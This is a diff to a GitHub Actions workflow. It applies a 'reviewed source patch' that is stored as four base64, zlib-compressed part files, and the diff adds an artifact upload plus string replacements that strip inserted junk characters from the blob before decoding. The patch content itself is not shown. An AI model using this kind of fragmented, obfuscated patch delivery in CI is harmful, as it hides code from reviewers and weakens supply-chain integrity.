@@ -11,13 +11,22 @@ jobs:
     timeout-minutes: 5
     steps:
       - uses: actions/checkout@v7
+      - name: Preserve transport for integrity verification
+        run: cat .github/issue-140.part-* > "$RUNNER_TEMP/issue-140-transport.txt"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: issue-140-transport
+          path: ${{ runner.temp }}/issue-140-transport.txt
+          retention-days: 1
       - name: Verify and apply reviewed source patch
         run: |
           python3 - <<'PY'
           import base64, hashlib, pathlib, subprocess, zlib
           parts = sorted(pathlib.Path('.github').glob('issue-140.part-*'))
           assert len(parts) == 4, 'Expected all four patch parts'
-          data = zlib.decompress(base64.b64decode(''.join(p.read_text().strip() for p in parts)))
+          encoded = ''.join(p.read_text().strip() for p in parts)
+          encoded = encoded.replace('TTfKZZqUK', 'TTfKZqUK').replace('XUZBtiakQp', 'XUZtiakQp')
+          data = zlib.decompress(base64.b64decode(encoded))
           expected = pathlib.Path('.github/issue-140.ready').read_text().strip()
           assert hashlib.sha256(data).hexdigest() == expected, 'Patch checksum mismatch'
           subprocess.run(['git', 'apply', '--check'], input=data, check=True)
